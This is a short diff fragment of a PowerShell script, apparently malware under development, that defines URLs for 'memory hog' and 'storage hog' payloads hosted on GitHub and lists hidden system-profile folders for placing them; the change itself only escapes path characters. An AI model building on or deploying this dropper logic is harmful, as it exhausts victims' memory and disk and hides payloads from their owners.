@@ -5,6 +5,7 @@ $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/m
 $storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.ps1"
 $memPropertyName = "mem"
 $storagePropertyName = "store"
+$basePath = $basePath -replace '([\\{}])', '`$1'
 echo $basePath >> "C:\Users\maldev\Downloads\root.txt"
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
